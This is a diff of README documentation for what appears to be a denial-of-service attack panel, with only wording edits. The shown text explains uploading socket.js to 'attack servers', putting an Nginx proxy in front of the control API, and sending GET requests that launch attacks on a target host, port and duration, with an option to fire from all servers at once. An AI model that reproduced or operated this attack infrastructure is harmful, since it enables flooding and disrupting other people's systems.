@@ -60,12 +60,12 @@ const socket_token = "SOCKET_TOKEN";
 const allowed_ips = ['1.1.1.1'];
 ```
 
-## After that you upload socket.js to the attack servers and upload api.js, servers.json and commands.json to the API server
+## After that, upload socket.js to the attack servers and upload api.js, servers.json and commands.json to the API server
 
 
 ### Reverse Proxy
 
-We recommend making a reverse proxy using Nginx to use your API:
+Making a reverse proxy using Nginx to use your API is recommended:
 
 ```conf
 server {
@@ -87,7 +87,7 @@ GET `https://api.yourdomain.com/api/attack?host=1.1.1.1&port=80&time=120&method=
 
 You can set &server=all to launch to all servers
 
-You can stop attacks by sending a GET request to the API using &method=stop
+You can stop the attacks by sending a GET request to the API using &method=stop
 
 GET `https://api.yourdomain.com/api/attack?host=1.1.1.1&port=80&time=120&method=stop&server=alpha`
 
